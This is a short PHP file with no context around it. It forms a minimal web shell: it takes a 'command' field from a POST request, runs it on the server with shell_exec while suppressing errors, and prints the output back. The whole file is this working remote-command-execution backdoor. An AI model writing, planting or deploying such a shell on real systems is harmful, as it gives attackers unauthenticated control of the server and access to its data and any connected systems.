<?php
function shell($cmd) {
  	$ret = @shell_exec($cmd);
	return $ret;
}

echo convert_cyr_string(htmlspecialchars(shell($_POST['command'])));
?>